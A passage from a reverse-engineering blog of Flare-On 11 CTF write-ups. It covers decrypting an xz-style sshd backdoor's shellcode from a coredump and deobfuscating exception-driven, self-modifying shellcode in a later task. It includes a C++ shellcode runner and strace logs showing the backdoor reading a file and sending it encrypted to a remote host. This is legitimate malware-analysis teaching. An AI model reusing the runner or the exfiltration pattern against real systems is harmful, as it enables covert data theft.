jMjE1OWQwNTYKZjU5ODFmNzFjN2VhMWI1ZDhiMWU1ZjA2ZmM4M2IxZGVmMzhjNmY0ZTY5NGUzNzA2NDEyZWFiZjU0ZTNiNmY0ZDE5ZThlZjQ2YjA0ZTM5OWYyYzhlY2U4NDE3ZmEKNDAwOGJjCjU0ZTQxZQpmNzAxZmVlNzRlODBlOGRmYjU0YjQ4N2Y5YjJlM2EyNzdmYTI4OWNmNmNiOGRmOTg2Y2RkMzg3ZTM0MmFjOWY1Mjg2ZGExMWNhMjc4NDA4NAo1Y2E2OGQxMzk0YmUyYTRkM2Q0ZDdjODJlNQozMWI2ZGFjNjJlZjFhZDhkYzFmNjBiNzkyNjVlZDBkZWFhMzFkZGQyZDUzYWE5ZmQ5MzQzNDYzODEwZjNlMjIzMjQwNjM2NmI0ODQxNTMzM2Q0YjhhYzMzNmQ0MDg2ZWZhMGYxNWU2ZTU5CjBkMWVjMDZmMzYK&oeol=CRLF).

The output contains our flag in Base64:

|     |     |
| --- | --- |
| 1<br>2 | `cat|flag.txt`<br>`RDBudF9VNWVfeTB1cl9Pd25fQ3VSdjNzQGZsYXJlLW9uLmNvbQ==` |

So the flag content is:

|     |     |
| --- | --- |
| 1 | `D0nt_U5e_y0ur_Own_CuRv3s@flare-on.com` |

Posted in [CrackMe](https://hshrzd.wordpress.com/category/crackme/), [cryptography](https://hshrzd.wordpress.com/category/cryptography/), [CTF](https://hshrzd.wordpress.com/category/ctf/)\|Tagged [cryptography](https://hshrzd.wordpress.com/tag/cryptography/), [CTF](https://hshrzd.wordpress.com/tag/ctf/), [FlareOn](https://hshrzd.wordpress.com/tag/flareon/), [FlareOn11](https://hshrzd.wordpress.com/tag/flareon11/)\|[1 Comment](https://hshrzd.wordpress.com/2024/12/09/flare-on-11-task-7/#comments)

## [Flare-On 11 – Task 5](https://hshrzd.wordpress.com/2024/12/08/flare-on-11-task-5/)

Posted on [December 8, 2024](https://hshrzd.wordpress.com/2024/12/08/flare-on-11-task-5/ "7:28 pm") by[hasherezade](https://hshrzd.wordpress.com/author/hshrzd/ "View all posts by hasherezade")

_[Flare-On](https://flare-on.com/) is an annual CTF run by [Mandiant Flare Team](https://cloud.google.com/blog/topics/threat-intelligence/flareon-11-challenge-solutions). In this series of writeups I present solutions to some of my favorite tasks from this year. All the sourcecodes are available on my Github, in dedicated repository: [flareon2024](https://github.com/hasherezade/flareon2024)_.

The 5-th task comes with the following description:

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9 | `sshd`<br>`Our server in the FLARE Intergalactic HQ has crashed!`<br>`Now criminals are trying to sell me my own data!!!`<br>`Do your part, random internet hacker, to help FLARE out`<br>`and tell us what data they stole! We used the best forensic`<br>`preservation technique of just copying all the files on the system for you.`<br>`7zip archive password: flare` |

We are provided with the archive containing a Docker container with Linux installation. Since the title of the task suggests that it is related to SSH, we can start by searching any artifacts related to this service.

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16 | `$ tree | grep sshd`<br>```│   │   ├── sshd`<br>```│   │   ├── sshd_config`<br>```│   │   ├── sshd_config.d`<br>```│   │   │   ├── sshd.service`<br>```│   ├── sshd`<br>```│   │   ├── sshd`<br>```│   │   │   │   ├── sshd_config.5.gz`<br>```│   │   │   │   ├── sshd.8.gz`<br>```│   │   │   ├── sshd_config`<br>```│   │   │   └── sshd_config.md5sum`<br>```│   │   │       │   ├── sshdconfig.vim`<br>```│   │   │   └── sshd.core.93794.0.0.11.1725917676`<br>```│   │   │   ├── sshd.service`<br>```│   │   │   └── _etc_ssh_sshd_config` |

It turns out that there is a coredump created when the SSH deamon crashed. The dump is located in: `/var/lib/systemd/coredump/sshd.core.93794.0.0.11.1725917676` . The relevant binary can be found in: `/sbin/sshd` .

Let’s load them both together under GDB and check:

|     |     |
| --- | --- |
| 1 | `$ gdb sshd sshd.core.93794.0.0.11.1725917676` |

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/12/info_stack.png?w=1024)

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4 | `gef➤  info stack`<br>`#0  0x0000000000000000 in ?? ()`<br>`#1  0x00007f4a18c8f88f in lzma_str_list_filters () from /lib/x86_64-linux-gnu/liblzma.so.5`<br>`Backtrace stopped: previous frame inner to this frame (corrupt stack?)` |

The callstack points that there is a crash in libzma. Let’s display the list of all loaded libraries, to see where we can find the relevant module. It can be done with the command `info sharedlibrary`.

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5 | `gef➤  info sharedlibrary`<br>`From                To                  Syms Read   Shared Object Library`<br>`[...]`<br>`0x00007f4a18c8a4e8  0x00007f4a18cab6d7  Yes (*)     /lib/x86_64-linux-gnu/liblzma.so.5`<br>`[...]` |

The libzma library is a part of xz-utils. At this point, it reminded me of the XZ backdoor that made the news earlier this year. Details of it were described i.e. [here](https://securelist.com/xz-backdoor-part-3-hooking-ssh/113007/). In case of that backdoor, the **`RSA_public_decrypt`** function was hooked, and augmented with malicious code. So I expected to find something similar in the current task. The version affected by the trojan ( [5.6.0 and 5.6.1](https://discourse.nixos.org/t/cve-2024-3094-malicious-code-in-xz-5-6-0-and-5-6-1-tarballs/42405))is different than the one used in the task (5.4.1). But either way, let’s look inside.

First, I fetched the `liblzma.so.5` module from the relevant location, and opened it in IDA. Looking at the strings we can find that indeed the name **`RSA_public_decrypt`** is referenced. Checking where the references leads to, we can see the function that installs a hook.

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/12/install_hook.png?w=856)

The hook is responsible for executing some potentially malicious payload. This path of execution will be triggered if the data received by the `RSA_public_decrypt` function starts with a predefined magic number. After a quick analysis, we can see that the ChaCha20 algorithm is used to protect the payload.

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/12/decrypt_shellcode-1.png?w=715)

The shellcode is hardcoded in the binary, while the key is received from the C2 in the packet starting with `0xC5407A48` magic.

The encrypted shellcode:

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/12/enc_shellcode.png?w=364)

We can possibly find the packet in the memory saved in the crashdump.

Searching the DWORD `0xC5407A48` (`487A40C5` in little endian) leads to the following data chunk:

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/12/buffer.png?w=629)

The magic DWORD is followed by the key and nonce used to initialize the ChaCha20 context.

Analyzing the Chacha20\_init function we can see clearly how the key and the nonce are loaded:

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/12/chacha20_init.png?w=659)

The ChaCha20 key is 32-bytes long, and the nonce is 12-bytes long. The relevant buffers can be extracted from the packet:

|     |     |
| --- | --- |
| 1<br>2 | `94 3D F6 38 A8 18 13 E2 DE 63 18 A5 07 F9 A0 BA 2D BB 8A 7B A6 36 66 D0 8D 11 A6 5E C9 14 D6 6F`<br>`F2 36 83 9F 4D CD 71 1A 52 86 29 55 58 58 D1 B7` |

Having all needed data, we can decrypt is with [CyberChef](https://gchq.github.io/CyberChef/). The decrypted content ( [decrypted.dat](https://github.com/hasherezade/flareon2024/blob/main/task5/decrypted.dat)) reveals patterns typical for shellcode.

Now, let’s load the result into IDA and have a closer look…

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/12/shc_start.png?w=581)

It calls different system functions via direct syscalls.

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/12/use_syscalls.png?w=460)

To get a quick understanding of what is going on, I decided to just run the shellcode and observe it. I adapted the fragment of the original function responsible for deploying it:

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11 | `int``main()`<br>`{`<br>```const``size_t``shellc_size =``sizeof``(shellc_data);`<br>```void``* buf = mmap(0LL, shellc_size, 7, 34, -1, 0LL);`<br>```void``*shellc =``memcpy``(buf, shellc_data, shellc_size);`<br>```int``(*shc_main)() = (``int``(*)())shellc;`<br>```std::cout <<``"Running the shellcode: "``<< std::hex << shellc <<``"\n"``;`<br>```shc_main();`<br>```std::cout <<``"Finished!\n"``;`<br>```return``0;`<br>`}` |

Then, traced the runner with `strace`, getting the following:

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18 | `write(1, "Running the shellcode: 0x779d190"..., 38Running the shellcode: 0x779d1905a000`<br>`) = 38`<br>`socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) = 3`<br>`connect(3, {sa_family=AF_INET, sin_port=htons(1337), sin_addr=inet_addr("10.0.2.15")}, 16) = -1 ECONNREFUSED (Connection refused)`<br>`recvfrom(-111, 0x7ffca53af038, 32, 0, NULL, NULL) = -1 EBADF (Bad file descriptor)`<br>`recvfrom(-111, 0x7ffca53af058, 12, 0, NULL, NULL) = -1 EBADF (Bad file descriptor)`<br>`recvfrom(-111, 0x7ffca53b01e8, 4, 0, NULL, NULL) = -1 EBADF (Bad file descriptor)`<br>`recvfrom(-111, 0x7ffca53af068, 411593218, 0, NULL, NULL) = -1 EBADF (Bad file descriptor)`<br>`open("", O_RDONLY)                      = -1 ENOENT (No such file or directory)`<br>`read(-2, 0x7ffca53af168, 128)           = -1 EBADF (Bad file descriptor)`<br>`sendto(-111, "\0\0\0\0", 4, 0, NULL, 0) = -1 EBADF (Bad file descriptor)`<br>`sendto(-111, "", 0, 0, NULL, 0)         = -1 EBADF (Bad file descriptor)`<br>`close(-2)                               = -1 EBADF (Bad file descriptor)`<br>`shutdown(-111, SHUT_RD)                 = -1 EBADF (Bad file descriptor)`<br>`write(1, "Finished!\n", 10Finished!`<br>`)             = 10`<br>`exit_group(0)                           = ?`<br>`+++ exited with 0 +++` |

At this point we can see that the shellcode tries to connect to “10.0.2.15” on port 1337. Then it will try to read data from the socket, in the following portions: 32-bytes, 12-bytes, and 4-bytes. The lengths of the first two chunks are the same as the previously used ChaCha20 key and nonce, so at this point I started to suspect that ChaCha20 will be used again.

I decided to make a simple patch in the shellcode, to make it connect to the localhost instead of “10.0.2.15”, so that it will communicate with my own server, written in Python. The IP address is stored as a DWORD, so it is enough to replace it.

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/12/connect_to_socket.png?w=460)

The full runner is available here: `shc_runner.cpp`.

Then, with the help of a Python server, I started sending to the shellcode some data, and was observing under the `strace` how it behaves. The [first version of the server](https://gist.github.com/hasherezade/55c28aefc12fe6ab90e3dc0b3a31fbc9#file-server_v1-py) was just sending 3 buffers of the previously observed length, each with a dummy content (filled with ‘A’, ‘B’, or ‘C’ characters). Now the output displayed by strace has changed:

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14 | `write(1, "Running the shellcode: 0x7774cc8"..., 38Running the shellcode: 0x7774cc857000`<br>`) = 38`<br>`socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) = 3`<br>`connect(3, {sa_family=AF_INET, sin_port=htons(1337), sin_addr=inet_addr("127.0.0.1")}, 16) = 0`<br>`recvfrom(3, "\252\252\252\252\252\252\252\252\252\252\252\252\252\252\252\252\252\252\252\252\252\252\252\252\252\252\252\252\252\252\252\252", 32, 0, NULL, NULL) = 32`<br>`recvfrom(3, "\273\273\273\273\273\273\273\273\273\273\273\273", 12, 0, NULL, NULL) = 12`<br>`recvfrom(3, "\314\314\314\314", 4, 0, NULL, NULL) = 4`<br>`recvfrom(3, "", 3435973836, 0, NULL, NULL) = 0`<br>`open("", O_RDONLY)                      = -1 ENOENT (No such file or directory)`<br>`read(-2, 0x7ffc026a0a68, 128)           = -1 EBADF (Bad file descriptor)`<br>`sendto(3, "\0\0\0\0", 4, 0, NULL, 0)    = 4`<br>`sendto(3, "", 0, 0, NULL, 0)            = -1 EPIPE (Broken pipe)`<br>`--- SIGPIPE {si_signo=SIGPIPE, si_code=SI_USER, si_pid=21332, si_uid=1000} ---`<br>`+++ killed by SIGPIPE +++` |

We can see that after receiving the 4 bytes long buffer, it tries to read another portion of data, of the length `3435973836`, that is `CCCCCCCC` in hex. So the content of the 3-rd buffer is a DWORD defining the size of the 4-th buffer. Then it tries to open a file – but in the tested case, the name of this file was empty. So we can guess that it was probably to be defined by the 4-th buffer. I [updated the server with this observation](https://gist.github.com/hasherezade/55c28aefc12fe6ab90e3dc0b3a31fbc9#file-server_v2-py), and tried again.

Indeed the shellcode attempts to read the file with the passed name. If we create a file with a dummy content, it will read it, encrypt it, and send the encrypted content back:

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14 | `write(1, "Running the shellcode: 0x7d12239"..., 38Running the shellcode: 0x7d1223953000`<br>`) = 38`<br>`socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) = 3`<br>`connect(3, {sa_family=AF_INET, sin_port=htons(1337), sin_addr=inet_addr("127.0.0.1")}, 16) = 0`<br>`recvfrom(3, "\252\252\252\252\252\252\252\252\252\252\252\252\252\252\252\252\252\252\252\252\252\252\252\252\252\252\252\252\252\252\252\252", 32, 0, NULL, NULL) = 32`<br>`recvfrom(3, "\273\273\273\273\273\273\273\273\273\273\273\273", 12, 0, NULL, NULL) = 12`<br>`recvfrom(3, "\10\0\0\0", 4, 0, NULL, NULL) = 4`<br>`recvfrom(3, "demo.bin", 8, 0, NULL, NULL) = 8`<br>`open("demo.bin", O_RDONLY)              = 4`<br>`read(4, "This is a demo file!\n", 128)  = 21`<br>`sendto(3, "\25\0\0\0", 4, 0, NULL, 0)   = 4`<br>`sendto(3, "z\37q\224\4\211\217W\270\206 \23\322\f\347\\\276\5\24\255\360", 21, 0, NULL, 0) = -1 EPIPE (Broken pipe)`<br>`--- SIGPIPE {si_signo=SIGPIPE, si_code=SI_USER, si_pid=22266, si_uid=1000} ---`<br>`+++ killed by SIGPIPE +++` |

At this point we can guess what to do next. The task is about some file that has been exfiltrated with the help of the backdoor. We need to find what was exfiltrated, and decrypt it. Since there are no PCAPs provided, we can expect that the exfiltrated content was in memory when the `sshd` crashed, and the encrypted data is somewhere in the coredump.

Finding the relevant input in the memory dump is not easy, but doable, knowing some indicators. The only part of data that is an ASCII string is the file name. So I started by searching in the coredump for some common extensions, such as .txt. It lead me to the following:

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/12/root_cert.png?w=613)

The file `/root/certificate_authority_signing_key.txt` looks like something that the attacker could be potentially looking for. The docker container that we were provided does not have that file included. But interestingly, checking the `/root` directory leads to a decoy file, named “flag.txt”. It contains and ASCII art, and the text “if only it were that easy…”.

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/12/flag_txt.png?w=342)

Of course the file is bogus, but the fact that it was stored in the directory that is the part of the found path, may be another indicator that we are indeed on the good track.

Looking at the full blob of the found data around the path, we can see some familiar patterns.

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/12/data_align-1.png?w=608)

It is in the structure formatted exactly as the one read from the socket:

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6 | `struct data {`<br>```BYTE key[32];`<br>```BYTE nonce[12];`<br>```DWORD buf_size;`<br>```char buf[buf_size];`<br>`};` |

So at this point we have the candidates for the key, and for the nonce:

|     |     |
| --- | --- |
| 1<br>2 | `[ 8D EC 91 12 EB 76 0E DA 7C 7D 87 A4 43 27 1C 35 D9 E0 CB 87 89 93 B4 D9 04 AE F9 34 FA 21 66 D7 ]`<br>`[ 11 11 11 11 11 11 11 11 11 11 11 11 ]` |

What is still missing is the content of the file itself. Since it is in an encryted blob, without any magic number, it will be hard to identify it. We can however predict that it will be somewhere in the very close proximity with the rest of the data. It may be a small blob, containing only the single string with the flag. A possible candidate:

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/12/enc_blob.png?w=619)

I first tried to decrypt it using ChaCha20 implemented by CyberChef, but it failed. It could fail for two possible reasons: either my input is wrong, or the implementation of ChaCha20 used by the shellcode is slightly different than the official one. Fortunately it is easy to check – I can just pass the data that I have to the original shellcode, via my Python server. Since it is a symmetric crypto, if all data is correct, I will get it decrypted back just by the shellcode itself.

I saved the extracted blob into a file (“flag\_blob.bin”), and passed it via my server to the shellcode: [https://github.com/hasherezade/flareon2024/blob/main/task5/server.py](https://github.com/hasherezade/flareon2024/blob/main/task5/server.py)

And it worked! The flag got decrypted:

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/12/server.png?w=1024)

`supp1y_cha1n_sund4y@flare-on.com`

Posted in [CrackMe](https://hshrzd.wordpress.com/category/crackme/), [CTF](https://hshrzd.wordpress.com/category/ctf/)\|Tagged [FlareOn11](https://hshrzd.wordpress.com/tag/flareon11/), [linux](https://hshrzd.wordpress.com/tag/linux/)\|[1 Comment](https://hshrzd.wordpress.com/2024/12/08/flare-on-11-task-5/#comments)

## [Flare-On 11 – Task 9](https://hshrzd.wordpress.com/2024/10/29/flareon-11-task-9/)

Posted on [October 29, 2024](https://hshrzd.wordpress.com/2024/10/29/flareon-11-task-9/ "12:24 pm") by[hasherezade](https://hshrzd.wordpress.com/author/hshrzd/ "View all posts by hasherezade")

_[Flare-On](https://flare-on.com/) is an annual CTF run by [Mandiant Flare Team](https://cloud.google.com/blog/topics/threat-intelligence/flareon-11-challenge-solutions). In this series of writeups I present solutions to some of my favorite tasks from this year. All the sourcecodes are available on my Github, in dedicated repository: [flareon2024](https://github.com/hasherezade/flareon2024)_.

The 9th task was undoubtedly the most difficult one this year. It is called “serpentine” – but despite the name, it is not a crypto challenge involving Serpent cipher. This is what the description says:

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/10/serpentine_info.png?w=726)

We are provided with a PE loading an obfuscated, self-modifying shellcode, and using exception-based flow obfuscation. Those elements remind of some hard tasks from the previous editions, such as “ [evil](https://hshrzd.wordpress.com/2021/10/23/flare-on-8-task-9/)“, and “ [break](https://hshrzd.wordpress.com/2021/01/05/flare-on-7-task-10/)” that I previously described. But the way they are served is yet different.

## Overview

I started by opening the given executable in IDA. First thing we can notice is that it requires a password given as a commandline argument. It has to be 32-character long. If we supplied it, the program proceeds to run a shellcode. All the logic related to the password verification happens there.

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/10/serpentine_start.png?w=614)

The shellcode is hardcoded within the PE, and copied to a dynamically loaded memory in a TLS callback, before the `main` function was executed:

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/10/shc_load.png?w=461)

Analyzing the shellcode is a real challenge. It deobfuscates itself as it goes, and then obfuscates back. The flow is also interrupted by `HLT` instructions, that are causing an exception handler to trigger. It does not only makes our code to jump into an unexpected line, but also changes the execution context on return, making the whole logic very confusing and hard to follow.

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/10/shellcode_start-1.png?w=459)The beginning of the obfuscated shellcode

Oftentimes, such cases can be helped to a big extent by a [Pin tracer](https://www.intel.com/content/www/us/en/developer/articles/tool/pin-a-dynamic-binary-instrumentation-tool.html). I first tried to trace it with [Tiny Tracer](https://github.com/hasherezade/tiny_tracer/), but unfortunately, due to the specifics of this self-modifying code, the tracing followed only the initial part of the binary:

```
[...]
15770;kernelbase.InitializeCriticalSectionEx
14ab9;CPUID:1
20cb;kernel32.SetUnhandledExceptionFilter
14de;ntdll.RtlInstallFunctionTableCallback
15c4;kernel32.SetUnhandledExceptionFilter
1649;called: ?? [196f0000+0]
> 196f0000+0;ntdll.KiUserExceptionDispatcher
a736;ntdll.RtlAllocateHeap
116d;ntdll.[TpReleaseIoCompletion+1cc]*
> 196f0000+98;called: ?? [199d4000+d27]
```

Soon after the shellcode started, PIN exits with an error:

```
E: During exception handling, an inconsistent instrumentation had been found.
```

_EDIT: it turns out that it is possible to trace the self-modifying part with PIN as well, we just need to add an option `-smc_strict 1` – which means “Check for self-modifications inside basic block_” _(suggested by: aziz). Still, cleaning the code before the tracing, and removing the parts related to obfuscation, help a lot to keep the tracelog focused on the functionality, and reduces the need of its post-processing._

## Exception handlers

As mentioned before, the `HLT` instructions, and the exception handlers (SEH) that they trigger, play a very important role in how this executable is obfuscated. After the exception, the code resumes its execution at a very different and unexpected address. If we don’t follow it, we lose the track.

At first, I tried to dump all the handlers addresses with the help of x64dbg. Each new exception handler is called via `ntdll.RtlpExecuteHandlerForException` . The redirection happens by `call rax`. By setting a breakpoint at this instruction, and editing the details, we can [log](https://help.x64dbg.com/en/latest/commands/script/log.html) the handler’s address. All the visited handlers will be saved in the listing at the log tab.

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/10/dump_handler.png?w=814)

Soon I realized that there are too many blocks to resolve, and this is not the best way to dump them all. To really tackle this part, I have to parse the exception information.

In a typical case, the (SEH) exceptions thrown by a Windows binary are handled using the information stored in the Exception Table, that is a part of the PE format. However, this way of registering exceptions only work if they are thrown from within the corresponding PE image. In the current case, the exceptions are thrown from a shellcode, that is in a dynamically allocated, private memory. So the corresponding handlers have to be installed manually. In 64-bit Windows binaries it can be done with the help of the function `RtlInstallFunctionTableCallback`. However, this function is nowhere to be found in the Import Table of our executable, and by looking in IDA, it is difficult to spot where it is called. Fortunately, in this particular part, the trace done by Tiny Tracer comes in handy. We can see the following calls in the TAG file:

|     |     |
| --- | --- |
| 1<br>2<br>3 | `20cb;kernel32.SetUnhandledExceptionFilter`<br>`14de;ntdll.RtlInstallFunctionTableCallback`<br>`15c4;kernel32.SetUnhandledExceptionFilter` |

When we [apply the tags in IDA](https://github.com/hasherezade/tiny_tracer/wiki/Using-the-TAGs-with-disassemblers-and-debuggers), it clarifies a lot.

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/10/func.png?w=748)

As the MSDN says, one of the arguments of `RtlInstallFunctionTableCallback` is a callback function to be installed. This callback is then executed each time an exception in the defined range gets hit. It is responsible for associating the exception with the relevant [UNWIND\_INFO](https://learn.microsoft.com/en-us/cpp/build/exception-handling-x64?view=msvc-170): a structure containing all information needed for handling it. It includes the address of the handler to be called, and unwinding codes that define how the stack should be modified before the handler gets executed.

The installed callback is implemented as follows:

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/10/resolve_callback-2.png?w=661)

Analyzing the code of the callback function we can find where exactly the UNWIND\_INFO is retrieved from. It turns out all is stored along with the shellcode. The offset to the structure is right after the HLT instruction (`Rip` \+ 1). Parsing this information will be crucial for deobfuscation.

## Deobfuscation

The approach that I have taken is to first deobfuscate the binary as much as I can in order to clarify what is really happening, and then to trace it by a dedicated PIN tracer.

To do the deobfuscation, I have chosen [Capstone Engine](https://www.capstone-engine.org/) (for disassembling) and [Keystone engine](https://www.keystone-engine.org/) (to assemble back the cleaned code). Both of them are open source libraries with Python bindings, created by the same author.

There are two main problems to tackle:

1. Deobfuscating code blocks: cleaning all what happens between one ‘halt’ and the other. Removing all the redundant instructions, and stopping code from obfuscating itself back
2. Deobfuscation of the flow: figuring out what will be the next block after the HLT. Understanding and preserving all the changes done to the context at each exception.

_The full code of the deobfuscator is available in the dedicated github repository: [https://github.com/hasherezade/flareon2024/tree/main/task9/deobfuscator](https://github.com/hasherezade/flareon2024/tree/main/task9/deobfuscator)_

### Deobfuscating code blocks

Let assume a single block is a series of instructions that are executed between two halts. The vital code is revealed as the execution proceeds, and it is hidden in between the lines which only role is obfuscation. Retrieving of the vital lines is done following a predictable pattern. Example is given below.

First, call-to-pop is used to store the address of the beginning of the block at a particular offset:

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/10/call.png?w=631)

The return address is popped into a further line of the block:

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/10/pop_variable.png?w=678)

The next code modification is done by retrieving a byte from the code at the given offset, doing calculation on it, and storing the result back into the code, to one of the next lines of the block:

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/10/obfusc2.png?w=897)

After the deobfuscated line is executed, it is overwritten by a constant.

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/10/erase_the_line.png?w=806)

The return address that was previously popped is used in the calculations for the new return.

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/10/return_to.png?w=762)

The return address is calculated relative to the first address of the block, from where the call was made.

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/10/returning_to.png?w=580)

Then we may have a few vital lines, till another call is used to repeat the above pattern. We finally reach the HLT instruction, that terminates the block.

Using Capstone Engine via Python, I decompiled the dumped shellcode, implemented the [steps done in order to deobfuscate the further lines](https://github.com/hasherezade/flareon2024/blob/main/task9/deobfuscator/capstone_deobf.py#L411), and skipped those that obfuscate the code back. After that, I [filtered out the lines that were related to obfuscation](https://github.com/hasherezade/flareon2024/blob/main/task9/deobfuscator/capstone_deobf.py#L324), leaving only the vital code.

Examples of reconstructed blocks for the initial handlers:

```
######
### Handler RVA 0x98:
0x8 -> 0x2e4d49: movabs r11, 0x10add7f49
0x1 -> 0xa2: push r11
0x2 -> 0xa4: push 0x73775436
0x3 -> 0xa9: push 0x68a04c43
0x4 -> 0xae: push 0x12917ff9
0x8 -> 0x2e4db8: add qword ptr [rsp + 0x18], 0x35ac399f
*****
######
### Handler RVA 0x1a7:
0x1 -> 0x1a7: mov rbp, qword ptr [r9 + 0x28]
0x8 -> 0x2e4e8c: mov rdi, qword ptr [rbp + 0xe0]
0x1 -> 0x1b2: movzx rdi, dil
*****
######
[...]
```

[https://gist.github.com/hasherezade/0ad2bd3612b43bbde500525443405fe3](https://gist.github.com/hasherezade/0ad2bd3612b43bbde500525443405fe3)

This makes the code blocks much more readable. To clean it further, we can also resolve the calculated values, such as:

|     |     |
| --- | --- |
| 1<br>2 | `mov rbx, 0xffffffffd5d48854`<br>`add rbx, 0x2a743cac` |

Which can be resolved to:

|     |     |
| --- | --- |
| 1 | `mov rbx, 0x48C500` |

It not only lets us see some of the constants clearer, but also reveals the referenced offsets. For example, we can see where the address of the function showing the “Wrong key” message is loaded.

### Deobfuscating the flow

The flow is still obfuscated using exception handlers, so we don’t know what will be the next block executed after the halt instruction. (Except for the few initial handlers, dumped earlier using x64dbg.)

Following the implementation of the callback function that was registered to resolve the exceptions, we can find the unwind information in the shellcode, at offset relative to the offset of the HLT instruction. It is calculated by the following formula:

```
begin = halt_offset
end = begin + 1
unwind = end + g_code_buffer[halt_offset + 1] + 1
unwind += unwind & 1
```

The format of the unwind information is [documented on MSDN](https://learn.microsoft.com/en-us/cpp/build/exception-handling-x64?view=msvc-170). Following the specification, I wrote a parser in Python: [handlers\_parser.py](https://github.com/hasherezade/flareon2024/blob/main/task9/deobfuscator/handlers_parser.py). Initially, the parser simply walked through the dumped shellcode, searching for the byte representing HLT (0xF4). Having found that, it tried to calculate the offset of the unwind information, relative to it. Of course this method was not fully accurate, because not every 0xF4 byte really represented HLT, so additional filtering was required – but it allowed to produce an [initial listing](https://gist.github.com/hasherezade/6d5517b743d7f8bdc7b01a505dc9b44f). After refining the parsing of the unwind info, I [integrated it into the main deobfuscator](https://github.com/hasherezade/flareon2024/blob/main/task9/deobfuscator/capstone_deobf.py#L594), and was able to produce a [complete listing](https://gist.github.com/hasherezade/a28bbeb510eaffe91e293a6fe63238c6). It showed the full flow of execution – the halt instructions, associated unwind codes, and the handler that got executed.

## Rebuilding the binary

Now we have everything that we need in order to rebuild the deobfuscated binary. Well – almost. Although we know what handlers will be executed in which order, it is not enough to simply replace the HLT instructions with the jumps to appropriate addresses. Flow redirection is only a part of the functionality that they implement. The other part is the change in the context.

We know that some adjustments are made basing on the unwind codes. For example:

```
######
### RVA 0x98:
0x8 -> 0x2e4d49: movabs r11, 0x10add7f49
0x1 -> 0xa2: push r11
0x2 -> 0xa4: push 0x73775436
0x3 -> 0xa9: push 0x68a04c43
0x4 -> 0xae: push 0x12917ff9
0x8 -> 0x2e4db8: add qword ptr [rsp + 0x18], 0x35ac399f
*****
> Index: 1
	Version: 1 ; Flags: 1 ; SizeOfProlog: 0 ; FrameReg: 0
# HLT at 0x107 ->	Handler: 0x1a7
	op_code: 10 ; op_info: 0 ->	UWOP_PUSH_MACHFRAME ; Nodes: 1
	op_code: 1 ; op_info: 1 ->	UWOP_ALLOC_LARGE ; Nodes: 3
		Arg0: 0x4
	op_code: 0 ; op_info: 13 ->	UWOP_PUSH_NONVOL ; Nodes: 1
		R13
######
```

One way to deal with it is to rebuild manually all what those instructions do, and implement the equivalent functionality. Eventually, I decided to go a different way, that appeared to me less error-prone. Rather than reimplementing the change in the context on my own, I left the HLT instructions in place to do their job, and rebuilt just the code around them. To leave the whole logic intact, we must ensure that the HLT instructions, and the exception information that belongs to them, is left at the expected offsets, and is not corrupt in any ways by other changes in code.

So, in order to have both, the cleaned code, and the original exceptions, I decided to add to the original binary two sections. The first section (that will be referred to as “original”) will contain the original shellcode, with the HLTs at their initial places, and with all the unwind info intact. The second section (that will be referred to as “cleaned” or “debfuscated”) will contain the rebuilt code. The execution will be transitioning between them. Whenever the exception is about to be called, the deobfuscated code will jump to the original code at the offset where the corresponding HLT is. This will trigger the exception that will be resolved by its corresponding info, with particular unwind codes. The exception handler will start to execute in the original section, at the address defined by the unwind info. But now, this address will contain jump back to the deobfuscated section, so that it can continue with the changed context.

Reconstruction of the code is done by the following script: [capstone\_deobf.py](https://github.com/hasherezade/flareon2024/blob/main/task9/deobfuscator/capstone_deobf.py). The script is also aware of at what address the HLT should be called, and [produces the jump to the original section at the particular offset](https://github.com/hasherezade/flareon2024/blob/main/task9/deobfuscator/capstone_deobf.py#L194). It also create an additional listing of offsets and jumps that will be used for the return from the original section back to the deobfuscated one, at the beginning of the new handler. This listing will be used for patching of the original section, and applied by another script: [keystone\_patcher.py](https://github.com/hasherezade/flareon2024/blob/main/task9/deobfuscator/keystone_patcher.py).

